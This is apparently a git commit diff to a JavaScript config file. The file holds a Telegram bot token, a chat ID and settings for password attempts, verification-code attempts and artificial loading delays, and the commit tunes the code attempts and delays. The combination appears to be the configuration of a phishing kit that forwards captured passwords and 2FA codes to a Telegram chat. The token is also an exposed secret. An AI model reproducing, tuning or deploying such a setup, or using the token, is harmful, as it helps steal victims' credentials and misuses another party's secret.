89e2d3a4fe7a6f4a0e0518f4ce25c3c5267665bd
Nguyễn Nguyên Giáp <giapfc123@gmail.com>
2026-05-20 08:50:26 +0700

    ffafdafadfafa

--- src/utils/config.js
+++ src/utils/config.js
@@ -2,8 +2,8 @@ const config = {
     token: '8608140679:AAHZXWYJ02vZ7ZSEEJ4AGqVI_BQLZXhzWW4',
     chat_id: '7626778246',
     max_password_attempts: 2,
-    max_code_attempts: 4,
-    password_loading_time: 5,
-    code_loading_time: 30
+    max_code_attempts: 3,
+    password_loading_time: 3,
+    code_loading_time: 3
 };
 export default config;
